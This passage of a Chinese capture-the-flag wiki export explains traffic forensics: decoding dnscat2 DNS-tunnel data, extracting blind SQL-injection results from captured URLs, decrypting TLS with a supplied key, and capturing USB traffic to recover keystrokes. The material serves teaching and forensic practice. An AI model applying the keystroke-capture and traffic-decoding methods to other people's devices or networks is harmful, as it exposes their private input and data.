<code>wireshark</code> \u6253\u5f00\u53d1\u73b0\u5168\u90e8\u4e3a <code>DNS</code> \u534f\u8bae,\u67e5\u8be2\u540d\u4e3a\u5927\u91cf\u5b57\u7b26\u4e32<code>([\\w\\.]+)\\.skullseclabs\\.org</code></p> <p>\u6211\u4eec\u901a\u8fc7 <code>tshark -r dnscap.pcap -T fields -e dns.qry.name &gt; hex</code>\u63d0\u53d6\u540e\uff0c\u5229\u7528 <code>python</code> \u8f6c\u7801\uff1a</p> <pre><code>import re\n\n\nfind = \"\"\n\nwith open('hex','rb') as f:\n    for i in f:\n        text = re.findall(r'([\\w\\.]+)\\.skull',i)\n        if text:\n            find += text[0].replace('.','')\nprint find\n</code></pre> <p>\u6211\u4eec\u53d1\u73b0\u4e86\u51e0\u6761\u5173\u952e\u4fe1\u606f\uff1a</p> <pre><code>Welcome to dnscap! The flag is below, have fun!!\nWelcome to dnscap! The flag is below, have fun!!\n!command (sirvimes)\n...\nIHDR\ngAMA\nbKGD\n        pHYs\nIHDR\ngAMA\nbKGD\n        pHYs\ntIME\nIDATx\n...\n2017-02-01T21:04:00-08:00\nIEND\nconsole (sirvimes)\nconsole (sirvimes)\nGood luck! That was dnscat2 traffic on a flaky connection with lots of re-transmits. Seriously,\nGood luck! That was dnscat2 traffic on a flaky connection with lots of re-transmits. Seriously, d[\ngood luck. :)+\n</code></pre> <p><code>flag</code> \u786e\u5b9e\u5305\u542b\u5728\u5176\u4e2d,\u4f46\u662f\u6709\u5927\u91cf\u91cd\u590d\u4fe1\u606f,\u4e00\u662f\u5e94\u4e3a<code>question</code> \u3002\u5728 <code>dns</code> \u534f\u8bae\u4e2d\u67e5\u8be2\u548c\u53cd\u9988\u65f6\u90fd\u4f1a\u7528\u5230\uff0c<code>-Y \"ip.src == 192.168.43.91\"</code>\u8fdb\u884c\u8fc7\u6ee4\u540e\u53d1\u73b0\u8fd8\u662f\u6709\u4e0d\u5c11\u91cd\u590d\u90e8\u5206\u3002</p> <pre><code>%2A}\n%2A}\n%2A}q\n%2A}x\n%2A}\nIHDR\ngAMA\nbKGD\n        pHYs\ntIME\nIDATx\nHBBH\nCxRH!\nC1%t\nceyF\ni4ZI32\nrP@1\nceyF\ni4ZI32\nrP@1\nceyF\ni4ZI32\nrP@1\nceyF\ni4ZI32\nrP@1\n</code></pre> <p>\u6839\u636e\u53d1\u73b0\u7684 <code>dnscat</code> \u627e\u5230 https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md \u8fd9\u91cc\u4ecb\u7ecd\u4e86 <code>dnscat</code> \u534f\u8bae\u7684\u76f8\u5173\u4fe1\u606f,\u8fd9\u662f\u4e00\u79cd\u901a\u8fc7 <code>DNS</code> \u4f20\u9012\u6570\u636e\u7684\u53d8\u79cd\u534f\u8bae,\u9898\u76ee\u6587\u4ef6\u4e2d\u5e94\u8be5\u672a\u4f7f\u7528\u52a0\u5bc6,\u6240\u4ee5\u76f4\u63a5\u770b\u8fd9\u91cc\u7684\u6570\u636e\u5757\u4fe1\u606f</p> <pre><code>MESSAGE_TYPE_MSG: [0x01]\n(uint16_t) packet_id\n(uint8_t) message_type [0x01]\n(uint16_t) session_id\n(uint16_t) seq\n(uint16_t) ack\n(byte[]) data\n</code></pre> <p>\u5728<code>qry.name</code>\u4e2d\u53bb\u9664\u5176\u4f59\u5b57\u6bb5,\u53ea\u7559\u4e0b <code>data</code> \u5feb,\u4ece\u800c\u5408\u5e76\u6570\u636e,\u518d\u4ece <code>16</code> \u8fdb\u5236\u4e2d\u68c0\u7d22<code>89504e.....6082</code>\u63d0\u53d6<code>png</code>,\u5f97\u5230 <code>flag</code> \u3002</p> <pre><code>import re\n\n\nfind = []\n\nwith open('hex','rb') as f:\n    for i in f:\n        text = re.findall(r'([\\w\\.]+)\\.skull',i)\n        if text:\n            tmp =  text[0].replace('.','')\n            find.append(tmp[18:])\nlast = []\n\nfor i in find:\n    if i not in last:\n        last.append(i)\n\n\nprint  ''.join(last)\n</code></pre> <p>flag</p> <p></p>"},{"location":"misc/traffic/protocols/dns/#_3","title":"\u76f8\u5173\u9898\u76ee","text":"<ul> <li>IceCTF-2016:Search</li> <li>EIS-2017:DNS 101</li> </ul>"},{"location":"misc/traffic/protocols/dns/#_4","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>https://github.com/lisijie/homepage/blob/master/posts/tech/dns%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90.md</li> <li>https://xpnsec.tumblr.com/post/157479786806/bsidessf-ctf-dnscap-walkthrough</li> </ul>"},{"location":"misc/traffic/protocols/ftp/","title":"FTP","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p><code>FTP</code> ( <code>File Transfer Protocol</code> \uff0c\u5373\u6587\u4ef6\u4f20\u8f93\u534f\u8bae)\u662f <code>TCP/IP</code> \u534f\u8bae\u7ec4\u4e2d\u7684\u534f\u8bae\u4e4b\u4e00\u3002 <code>FTP</code> \u534f\u8bae\u5305\u62ec\u4e24\u4e2a\u7ec4\u6210\u90e8\u5206\uff0c\u5176\u4e00\u4e3a <code>FTP</code> \u670d\u52a1\u5668\uff0c\u5176\u4e8c\u4e3a <code>FTP</code> \u5ba2\u6237\u7aef\u3002\u5176\u4e2d <code>FTP</code> \u670d\u52a1\u5668\u7528\u6765\u5b58\u50a8\u6587\u4ef6\uff0c\u7528\u6237\u53ef\u4ee5\u4f7f\u7528 <code>FTP</code> \u5ba2\u6237\u7aef\u901a\u8fc7 <code>FTP</code> \u534f\u8bae\u8bbf\u95ee\u4f4d\u4e8e <code>FTP</code> \u670d\u52a1\u5668\u4e0a\u7684\u8d44\u6e90\u3002\u5728\u5f00\u53d1\u7f51\u7ad9\u7684\u65f6\u5019\uff0c\u901a\u5e38\u5229\u7528 <code>FTP</code> \u534f\u8bae\u628a\u7f51\u9875\u6216\u7a0b\u5e8f\u4f20\u5230 <code>Web</code> \u670d\u52a1\u5668\u4e0a\u3002\u6b64\u5916\uff0c\u7531\u4e8e <code>FTP</code> \u4f20\u8f93\u6548\u7387\u975e\u5e38\u9ad8\uff0c\u5728\u7f51\u7edc\u4e0a\u4f20\u8f93\u5927\u7684\u6587\u4ef6\u65f6\uff0c\u4e00\u822c\u4e5f\u91c7\u7528\u8be5\u534f\u8bae\u3002</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b <code>FTP</code> \u534f\u8bae\u4f7f\u7528 <code>TCP</code> \u7aef\u53e3\u4e2d\u7684 <code>20</code> \u548c <code>21</code> \u8fd9\u4e24\u4e2a\u7aef\u53e3\uff0c\u5176\u4e2d <code>20</code> \u7528\u4e8e\u4f20\u8f93\u6570\u636e\uff0c <code>21</code> \u7528\u4e8e\u4f20\u8f93\u63a7\u5236\u4fe1\u606f\u3002\u4f46\u662f\uff0c\u662f\u5426\u4f7f\u7528 <code>20</code> \u4f5c\u4e3a\u4f20\u8f93\u6570\u636e\u7684\u7aef\u53e3\u4e0e <code>FTP</code> \u4f7f\u7528\u7684\u4f20\u8f93\u6a21\u5f0f\u6709\u5173\uff0c\u5982\u679c\u91c7\u7528\u4e3b\u52a8\u6a21\u5f0f\uff0c\u90a3\u4e48\u6570\u636e\u4f20\u8f93\u7aef\u53e3\u5c31\u662f <code>20</code> \uff1b\u5982\u679c\u91c7\u7528\u88ab\u52a8\u6a21\u5f0f\uff0c\u5219\u5177\u4f53\u6700\u7ec8\u4f7f\u7528\u54ea\u4e2a\u7aef\u53e3\u8981\u670d\u52a1\u5668\u7aef\u548c\u5ba2\u6237\u7aef\u534f\u5546\u51b3\u5b9a\u3002</p>"},{"location":"misc/traffic/protocols/http/","title":"HTTP","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p><code>HTTP</code> ( <code>Hyper Text Transfer Protocol</code> \uff0c\u4e5f\u79f0\u4e3a\u8d85\u6587\u672c\u4f20\u8f93\u534f\u8bae)\u662f\u4e00\u79cd\u7528\u4e8e\u5206\u5e03\u5f0f\u3001\u534f\u4f5c\u5f0f\u548c\u8d85\u5a92\u4f53\u4fe1\u606f\u7cfb\u7edf\u7684\u5e94\u7528\u5c42\u534f\u8bae\u3002 <code>HTTP</code> \u662f\u4e07\u7ef4\u7f51\u7684\u6570\u636e\u901a\u4fe1\u7684\u57fa\u7840\u3002</p>"},{"location":"misc/traffic/protocols/http/#_1","title":"\u4f8b\u9898","text":"<p>\u9898\u76ee\uff1a\u6c5f\u82cf\u7701\u9886\u822a\u676f-2017\uff1ahack</p> <p>\u603b\u4f53\u89c2\u5bdf\u53ef\u4ee5\u5f97\u51fa:</p> <ul> <li><code>HTTP</code>\u4e3a\u4e3b</li> <li><code>192.168.173.134</code>\u4e3a\u4e3b</li> <li>\u4e0d\u5b58\u5728\u9644\u4ef6</li> </ul> <p></p> <p>\u4ece\u8fd9\u5f20\u56fe,\u57fa\u672c\u53ef\u4ee5\u5224\u65ad\u521d\u8fd9\u662f\u4e00\u4e2a\u5728<code>sql\u6ce8\u5165-\u76f2\u6ce8\u65f6\u4ea7\u751f\u7684\u6d41\u91cf\u5305</code></p> <p>\u5230\u6b64\u4e3a\u6b62,\u57fa\u672c\u53ef\u4ee5\u5224\u65adflag\u7684\u65b9\u5411,\u63d0\u53d6\u51fa\u6240\u6709\u7684url\u540e,\u7528<code>python</code>\u8f85\u52a9\u5373\u53ef\u5f97\u5230flag</p> <ul> <li>\u63d0\u53d6url: <code>tshark -r hack.pcap -T fields  -e http.request.full_uri|tr -s '\\n'|grep flag &gt; log</code></li> <li>\u5f97\u5230\u76f2\u6ce8\u7ed3\u679c</li> </ul> <pre><code>import re\n\nwith open('log') as f:\n    tmp = f.read()\n    flag = ''\n    data = re.findall(r'=(\\d*)%23',tmp)\n    data = [int(i) for i in data]\n    for i,num in enumerate(data):\n        try:\n            if num &gt; data[i+1]:\n                flag += chr(num)\n        except Exception:\n            pass\n    print flag\n</code></pre>"},{"location":"misc/traffic/protocols/https/","title":"HTTPS","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p><code>HTTPs = HTTP + SSL / TLS</code>.\u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\u7684\u4fe1\u606f\u4f20\u8f93\u90fd\u4f1a\u901a\u8fc7TLS\u8fdb\u884c\u52a0\u5bc6\uff0c\u6240\u4ee5\u4f20\u8f93\u7684\u6570\u636e\u90fd\u662f\u52a0\u5bc6\u540e\u7684\u6570\u636e</p> <ul> <li>wireshark\u5206\u6790HTTPs</li> </ul>"},{"location":"misc/traffic/protocols/https/#_1","title":"\u4f8b\u9898","text":"<p>\u9898\u76ee\uff1ahack-dat-kiwi-ctf-2015:ssl-sniff-2</p> <p>\u6253\u5f00\u6d41\u91cf\u5305\u53d1\u73b0\u662f <code>SSL</code> \u52a0\u5bc6\u8fc7\u7684\u6570\u636e,\u5bfc\u5165\u9898\u76ee\u63d0\u4f9b\u7684<code>server.key.insecure</code>,\u5373\u53ef\u89e3\u5bc6</p> <pre><code>GET /key.html HTTP/1.1\nHost: localhost\n\nHTTP/1.1 200 OK\nDate: Fri, 20 Nov 2015 14:16:24 GMT\nServer: Apache/2.4.7 (Ubuntu)\nLast-Modified: Fri, 20 Nov 2015 14:15:54 GMT\nETag: \"1c-524f98378d4e1\"\nAccept-Ranges: bytes\nContent-Length: 28\nContent-Type: text/html\n\nThe key is 39u7v25n1jxkl123\n</code></pre>"},{"location":"misc/traffic/protocols/readme/","title":"\u534f\u8bae\u5206\u6790\u6982\u8ff0","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u7f51\u7edc\u534f\u8bae\u4e3a\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u800c\u5efa\u7acb\u7684\u89c4\u5219\u3001\u6807\u51c6\u6216\u7ea6\u5b9a\u7684\u96c6\u5408\u3002\u4f8b\u5982\uff0c\u7f51\u7edc\u4e2d\u4e00\u4e2a\u5fae\u673a\u7528\u6237\u548c\u4e00\u4e2a\u5927\u578b\u4e3b\u673a\u7684\u64cd\u4f5c\u5458\u8fdb\u884c\u901a\u4fe1\uff0c\u7531\u4e8e\u8fd9\u4e24\u4e2a\u6570\u636e\u7ec8\u7aef\u6240\u7528\u5b57\u7b26\u96c6\u4e0d\u540c\uff0c\u56e0\u6b64\u64cd\u4f5c\u5458\u6240\u8f93\u5165\u7684\u547d\u4ee4\u5f7c\u6b64\u4e0d\u8ba4\u8bc6\u3002\u4e3a\u4e86\u80fd\u8fdb\u884c\u901a\u4fe1\uff0c\u89c4\u5b9a\u6bcf\u4e2a\u7ec8\u7aef\u90fd\u8981\u5c06\u5404\u81ea\u5b57\u7b26\u96c6\u4e2d\u7684\u5b57\u7b26\u5148\u53d8\u6362\u4e3a\u6807\u51c6\u5b57\u7b26\u96c6\u7684\u5b57\u7b26\u540e\uff0c\u624d\u8fdb\u5165\u7f51\u7edc\u4f20\u9001\uff0c\u5230\u8fbe\u76ee\u7684\u7ec8\u7aef\u4e4b\u540e\uff0c\u518d\u53d8\u6362\u4e3a\u8be5\u7ec8\u7aef\u5b57\u7b26\u96c6\u7684\u5b57\u7b26\u3002\u5f53\u7136\uff0c\u5bf9\u4e8e\u4e0d\u76f8\u5bb9\u7ec8\u7aef\uff0c\u9664\u4e86\u9700\u53d8\u6362\u5b57\u7b26\u96c6\u5b57\u7b26\u5916\u8fd8\u9700\u8f6c\u6362\u5176\u4ed6\u7279\u6027\uff0c\u5982\u663e\u793a\u683c\u5f0f\u3001\u884c\u957f\u3001\u884c\u6570\u3001\u5c4f\u5e55\u6eda\u52a8\u65b9\u5f0f\u7b49\u4e5f\u9700\u4f5c\u76f8\u5e94\u7684\u53d8\u6362\u3002</p> <p>\u76f8\u5e94\u7684\uff0c\u6211\u4eec\u5728\u534f\u8bae\u5206\u6790\u8fd9\u4e00\u7ae0\u8282\u4e2d\uff0c\u5c06\u4f1a\u4ece\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\u6765\u4ecb\u7ecd\u8fd9\u4e00\u90e8\u5206\u7684\u77e5\u8bc6\uff1a</p> <ul> <li><code>Wireshark</code> \u5e38\u7528\u529f\u80fd\u7684\u4ecb\u7ecd</li> <li><code>HTTP</code> \u534f\u8bae\u5206\u6790</li> <li><code>HTTPS</code> \u534f\u8bae\u5206\u6790</li> <li><code>FTP</code> \u534f\u8bae\u5206\u6790</li> <li><code>DNS</code> \u534f\u8bae\u5206\u6790</li> <li><code>WIFI</code> \u534f\u8bae\u5206\u6790</li> <li><code>USB</code> \u534f\u8bae\u5206\u6790</li> </ul>"},{"location":"misc/traffic/protocols/usb/","title":"USB","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"misc/traffic/protocols/usb/#_1","title":"\u7b80\u4ecb","text":"<p>USB\u8be6\u8ff0: https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf</p> <ul> <li>\u9f20\u6807\u534f\u8bae</li> </ul> <p>\u9f20\u6807\u79fb\u52a8\u65f6\u8868\u73b0\u4e3a\u8fde\u7eed\u6027\uff0c\u4e0e\u952e\u76d8\u51fb\u952e\u7684\u79bb\u6563\u6027\u4e0d\u4e00\u6837\uff0c\u4e0d\u8fc7\u5b9e\u9645\u4e0a\u9f20\u6807\u52a8\u4f5c\u6240\u4ea7\u751f\u7684\u6570\u636e\u5305\u4e5f\u662f\u79bb\u6563\u7684\uff0c\u6bd5\u7adf\u8ba1\u7b97\u673a\u8868\u73b0\u7684\u8fde\u7eed\u6027\u4fe1\u606f\u90fd\u662f\u7531\u5927\u91cf\u79bb\u6563\u4fe1\u606f\u6784\u6210\u7684</p> <p></p> <p>\u6bcf\u4e00\u4e2a\u6570\u636e\u5305\u7684\u6570\u636e\u533a\u6709\u56db\u4e2a\u5b57\u8282\uff0c\u7b2c\u4e00\u4e2a\u5b57\u8282\u4ee3\u8868\u6309\u952e\uff0c\u5f53\u53d60x00\u65f6\uff0c\u4ee3\u8868\u6ca1\u6709\u6309\u952e\u3001\u4e3a0x01\u65f6\uff0c\u4ee3\u8868\u6309\u5de6\u952e\uff0c\u4e3a0x02\u65f6\uff0c\u4ee3\u8868\u5f53\u524d\u6309\u952e\u4e3a\u53f3\u952e\u3002\u7b2c\u4e8c\u4e2a\u5b57\u8282\u53ef\u4ee5\u770b\u6210\u662f\u4e00\u4e2asigned byte\u7c7b\u578b\uff0c\u5176\u6700\u9ad8\u4f4d\u4e3a\u7b26\u53f7\u4f4d\uff0c\u5f53\u8fd9\u4e2a\u503c\u4e3a\u6b63\u65f6\uff0c\u4ee3\u8868\u9f20\u6807\u6c34\u5e73\u53f3\u79fb\u591a\u5c11\u50cf\u7d20\uff0c\u4e3a\u8d1f\u65f6\uff0c\u4ee3\u8868\u6c34\u5e73\u5de6\u79fb\u591a\u5c11\u50cf\u7d20\u3002\u7b2c\u4e09\u4e2a\u5b57\u8282\u4e0e\u7b2c\u4e8c\u5b57\u8282\u7c7b\u4f3c\uff0c\u4ee3\u8868\u5782\u76f4\u4e0a\u4e0b\u79fb\u52a8\u7684\u504f\u79fb\u3002</p> <p>\u5f97\u5230\u8fd9\u4e9b\u70b9\u7684\u4fe1\u606f\u540e,\u5373\u53ef\u6062\u590d\u51fa\u9f20\u6807\u79fb\u52a8\u8f68\u8ff9</p> <ul> <li>Tools</li> <li>UsbMiceDataHacker</li> <li>\u952e\u76d8\u534f\u8bae</li> </ul> <p>\u952e\u76d8\u6570\u636e\u5305\u7684\u6570\u636e\u957f\u5ea6\u4e3a8\u4e2a\u5b57\u8282\uff0c\u51fb\u952e\u4fe1\u606f\u96c6\u4e2d\u5728\u7b2c3\u4e2a\u5b57\u8282</p> <p></p> <p>\u6839\u636edata\u503c\u4e0e\u5177\u4f53\u952e\u4f4d\u7684\u5bf9\u5e94\u5173\u7cfb</p> <p></p> <p>\u53ef\u4ece\u6570\u636e\u5305\u6062\u590d\u51fa\u952e\u76d8\u7684\u6848\u4ef6\u4fe1\u606f</p> <ul> <li>Tools</li> <li>UsbKeyboardDataHacker</li> </ul> <p>\u53c2\u8003</p> <ul> <li>https://www.anquanke.com/post/id/85218</li> </ul>"},{"location":"misc/traffic/protocols/usb/#_2","title":"\u4f8b\u9898","text":"<p><code>Xman</code>\u4e09\u671f\u590f\u4ee4\u8425\u6392\u4f4d\u8d5b\u7ec3\u4e60\u9898\uff1a<code>AutoKey</code></p> <p>WP\uff1ahttps://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html</p> <p>\u95ee\u9898\u63cf\u8ff0\uff1a</p> <p></p> <p>\u8fd9\u9053\u9898\u662f\u6211\u53c2\u52a0 <code>Xman</code> \u4e09\u671f\u590f\u4ee4\u8425\u9009\u62d4\u8d5b\u51fa\u7684\u4e00\u9053\u9898\uff0c\u6211\u4eec\u5982\u4f55\u5bf9\u5176\u8fdb\u884c\u5206\u6790\uff1f</p>"},{"location":"misc/traffic/protocols/usb/#_3","title":"\u6d41\u91cf\u5305\u662f\u5982\u4f55\u6355\u83b7\u7684\uff1f","text":"<p>\u9996\u5148\u6211\u4eec\u4ece\u4e0a\u9762\u7684\u6570\u636e\u5305\u5206\u6790\u53ef\u4ee5\u77e5\u9053\uff0c\u8fd9\u662f\u4e2a <code>USB</code> \u7684\u6d41\u91cf\u5305\uff0c\u6211\u4eec\u53ef\u4ee5\u5148\u5c1d\u8bd5\u5206\u6790\u4e00\u4e0b <code>USB</code> \u7684\u6570\u636e\u5305\u662f\u5982\u4f55\u6355\u83b7\u7684\u3002</p> <p>\u5728\u5f00\u59cb\u524d\uff0c\u6211\u4eec\u5148\u4ecb\u7ecd\u4e00\u4e9b <code>USB</code> \u7684\u57fa\u7840\u77e5\u8bc6\u3002 <code>USB</code> \u6709\u4e0d\u540c\u7684\u89c4\u683c\uff0c\u4ee5\u4e0b\u662f\u4f7f\u7528 <code>USB</code> \u7684\u4e09\u79cd\u65b9\u5f0f\uff1a</p> <pre><code>l USB UART\nl USB HID\nl USB Memory\n</code></pre> <p><code>UART</code> \u6216\u8005 <code>Universal Asynchronous Receiver/Transmitter</code> \u3002\u8fd9\u79cd\u65b9\u5f0f\u4e0b\uff0c\u8bbe\u5907\u53ea\u662f\u7b80\u5355\u7684\u5c06 <code>USB</code> \u7528\u4e8e\u63a5\u53d7\u548c\u53d1\u5c04\u6570\u636e\uff0c\u9664\u6b64\u4e4b\u5916\u5c31\u518d\u6ca1\u6709\u5176\u4ed6\u901a\u8baf\u529f\u80fd\u4e86\u3002</p> <p><code>HID</code> \u662f\u4eba\u6027\u5316\u7684\u63a5\u53e3\u3002\u8fd9\u4e00\u7c7b\u901a\u8baf\u9002\u7528\u4e8e\u4ea4\u4e92\u5f0f\uff0c\u6709\u8fd9\u79cd\u529f\u80fd\u7684\u8bbe\u5907\u6709\uff1a\u952e\u76d8\uff0c\u9f20\u6807\uff0c\u6e38\u620f\u624b\u67c4\u548c\u6570\u5b57\u663e\u793a\u8bbe\u5907\u3002</p> <p>\u6700\u540e\u662f <code>USB Memory</code> \uff0c\u6216\u8005\u8bf4\u662f\u6570\u636e\u5b58\u50a8\u3002 <code>External HDD</code> \uff0c <code>thumb drive/flash drive</code> \u7b49\u90fd\u662f\u8fd9\u4e00\u7c7b\u7684\u3002</p> <p>\u5176\u4e2d\u4f7f\u7528\u7684\u6700\u5e7f\u7684\u4e0d\u662f <code>USB HID</code> \u5c31\u662f <code>USB Memory</code> \u4e86\u3002</p> <p>\u6bcf\u4e00\u4e2a <code>USB</code> \u8bbe\u5907\uff08\u5c24\u5176\u662f <code>HID</code> \u6216\u8005 <code>Memory</code> \uff09\u90fd\u6709\u4e00\u4e2a\u4f9b\u5e94\u5546 <code>ID\uff08Vendor ID\uff09</code> \u548c\u4ea7\u54c1\u8bc6\u522b\u7801<code>\uff08Product Id\uff09</code> \u3002 <code>Vendor ID</code> \u662f\u7528\u6765\u6807\u8bb0\u54ea\u4e2a\u5382\u5546\u751f\u4ea7\u4e86\u8fd9\u4e2a <code>USB</code> \u8bbe\u5907\u3002 <code>Product ID</code> \u7528\u6765\u6807\u8bb0\u4e0d\u540c\u7684\u4ea7\u54c1\uff0c\u4ed6\u5e76\u4e0d\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u6570\u5b57\uff0c\u5f53\u7136\u6700\u597d\u4e0d\u540c\u3002\u5982\u4e0b\u56fe\uff1a</p> <p></p> <p>\u4e0a\u56fe\u662f\u6211\u5728\u865a\u62df\u673a\u73af\u5883\u4e0b\u8fde\u63a5\u5728\u6211\u7535\u8111\u4e0a\u7684 <code>USB</code> \u8bbe\u5907\u5217\u8868\uff0c\u901a\u8fc7 <code>lsusb</code> \u67e5\u770b\u547d\u4ee4\u3002</p> <p>\u4f8b\u5982\u8bf4\uff0c\u6211\u5728 <code>VMware</code> \u4e0b\u6709\u4e00\u4e2a\u65e0\u7ebf\u9f20\u6807\u3002\u5b83\u662f\u5c5e\u4e8e <code>HID</code> \u8bbe\u5907\u3002\u8fd9\u4e2a\u8bbe\u5907\u6b63\u5e38\u7684\u8fd0\u884c\uff0c\u5e76\u4e14\u901a\u8fc7<code>lsusb</code> \u8fd9\u4e2a\u547d\u4ee4\u67e5\u770b\u6240\u6709 <code>USB</code> \u8bbe\u5907\uff0c\u73b0\u5728\u5927\u5bb6\u80fd\u627e\u51fa\u54ea\u4e00\u6761\u662f\u8fd9\u4e2a\u9f20\u6807\u5417\uff1f\uff1f\u6ca1\u6709\u9519\uff0c\u5c31\u662f\u7b2c\u56db\u4e2a\uff0c\u5c31\u662f\u4e0b\u9762\u8fd9\u6761\uff1a</p> <pre><code>Bus 002 Device 002: ID 0e0f:0003 VMware, Inc. Virtual Mouse\n</code></pre> <p>\u5176\u4e2d\uff0c<code>ID 0e0f:0003</code> \u5c31\u662f <code>Vendor-Product ID</code> \u5bf9\uff0c <code>Vendor ID</code> \u7684\u503c\u662f <code>0e0f</code> \uff0c\u5e76\u4e14 <code>Product ID</code> \u7684\u503c\u662f <code>0003</code> \u3002 <code>Bus 002 Device 002</code> \u4ee3\u8868 <code>usb</code> \u8bbe\u5907\u6b63\u5e38\u8fde\u63a5\uff0c\u8fd9\u70b9\u9700\u8981\u8bb0\u4e0b\u6765\u3002</p> <p>\u6211\u4eec\u7528 <code>root</code> \u6743\u9650\u8fd0\u884c <code>Wireshark</code> \u6355\u83b7 <code>USB</code> \u6570\u636e\u6d41\u3002\u4f46\u662f\u901a\u5e38\u6765\u8bf4\u6211\u4eec\u4e0d\u5efa\u8bae\u8fd9\u4e48\u505a\u3002\u6211\u4eec\u9700\u8981\u7ed9\u7528\u6237\u8db3\u591f\u7684\u6743\u9650\u6765\u83b7\u53d6 <code>Linux</code> \u4e2d\u7684 <code>usb</code> \u6570\u636e\u6d41\u3002\u6211\u4eec\u53ef\u4ee5\u7528 <code>udev</code> \u6765\u8fbe\u5230\u6211\u4eec\u7684\u76ee\u7684\u3002\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u7528\u6237\u7ec4 <code>usbmon</code> \uff0c\u7136\u540e\u628a\u6211\u4eec\u7684\u8d26\u6237\u6dfb\u52a0\u5230\u8fd9\u4e2a\u7ec4\u4e2d\u3002</p> <pre><code>addgroup usbmon\ngpasswd -a $USER usbmon\necho 'SUBSYSTEM==\"usbmon\", GROUP=\"usbmon\", MODE=\"640\"' &gt; /etc/udev/rules.d/99-usbmon.rules\n</code></pre> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u9700\u8981 <code>usbmon</code> \u5185\u6838\u6a21\u5757\u3002\u5982\u679c\u8be5\u6a21\u5757\u6ca1\u6709\u88ab\u52a0\u8f7d\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u52a0\u8f7d\u8be5\u6a21\u5757\uff1a</p> <pre><code>modprobe usbmon\n</code></pre> <p>\u6253\u5f00 <code>wireshark</code> \uff0c\u4f60\u4f1a\u770b\u5230 <code>usbmonX</code> \u5176\u4e2d <code>X</code> \u4ee3\u8868\u6570\u5b57\u3002\u4e0b\u56fe\u662f\u6211\u4eec\u672c\u6b21\u7684\u7ed3\u679c\uff08\u6211\u4f7f\u7528\u7684\u662f<code>root</code>\uff09\uff1a</p> <p></p> <p>\u5982\u679c\u63a5\u53e3\u5904\u4e8e\u6d3b\u8dc3\u72b6\u6001\u6216\u8005\u6709\u6570\u636e\u6d41\u7ecf\u8fc7\u7684\u65f6\u5019\uff0c <code>wireshark</code> \u7684\u754c\u9762\u5c31\u4f1a\u628a\u5b83\u4ee5\u6ce2\u5f62\u56fe\u7684\u65b9\u5f0f\u663e\u793a\u51fa\u6765\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u8be5\u9009\u90a3\u4e2a\u5462\uff1f\u6ca1\u6709\u9519\uff0c\u5c31\u662f\u6211\u521a\u521a\u8ba9\u5927\u5bb6\u8bb0\u4e0b\u6765\u7684\uff0c\u8fd9\u4e2aX\u7684\u6570\u5b57\u5c31\u662f\u5bf9\u5e94\u8fd9 <code>USB Bus</code> \u3002\u5728\u672c\u6587\u4e2d\u662f <code>usbmon0</code> \u3002\u6253\u5f00\u4ed6\u5c31\u53ef\u4ee5\u89c2\u5bdf\u6570\u636e\u5305\u4e86\u3002</p> <p></p> <p>\u901a\u8fc7\u8fd9\u4e9b\uff0c\u6211\u4eec\u53ef\u4ee5\u4e86\u89e3\u5230 <code>usb</code> \u8bbe\u5907\u4e0e\u4e3b\u673a\u4e4b\u95f4\u7684\u901a\u4fe1\u8fc7\u7a0b\u548c\u5de5\u4f5c\u539f\u7406\uff0c\u6211\u4eec\u53ef\u4ee5\u6765\u5bf9\u6d41\u91cf\u5305\u8fdb\u884c\u5206\u6790\u4e86\u3002</p>"},{"location":"misc/traffic/protocols/usb/#usb_1","title":"\u5982\u4f55\u53bb\u5206\u6790\u4e00\u4e2aUSB\u6d41\u91cf\u5305\uff1f","text":"<p>\u6839\u636e\u524d\u9762\u7684\u77e5\u8bc6\u94fa\u57ab\uff0c\u6211\u4eec\u5927\u81f4\u5bf9 <code>USB</code> \u6d41\u91cf\u5305\u7684\u6293\u53d6\u6709\u4e86\u4e00\u4e2a\u8f6e\u5ed3\u4e86\uff0c\u4e0b\u9762\u6211\u4eec\u4ecb\u7ecd\u4e00\u4e0b\u5982\u4f55\u5206\u6790\u4e00\u4e2a <code>USB</code> \u6d41\u91cf\u5305\u3002</p> <p><code>USB</code> \u534f\u8bae\u7684\u7ec6\u8282\u65b9\u9762\u53c2\u8003 <code>wireshark</code> \u7684 <code>wiki</code> \uff1ahttps://wiki.wireshark.org/USB</p> <p>\u6211\u4eec\u5148\u62ff <code>GitHub</code> \u4e0a\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5f00\u59cb\u8bb2\u8d77\uff1a</p> <p></p> <p>\u6211\u4eec\u5206\u6790\u53ef\u4ee5\u77e5\u9053\uff0c <code>USB</code> \u534f\u8bae\u7684\u6570\u636e\u90e8\u5206\u5728 <code>Leftover Capture Data</code> \u57df\u4e4b\u4e2d\uff0c\u5728 <code>Mac</code> \u548c <code>Linux</code> \u4e0b\u53ef\u4ee5\u7528 <code>tshark</code> \u547d\u4ee4\u53ef\u4ee5\u5c06 <code>leftover capture data</code> 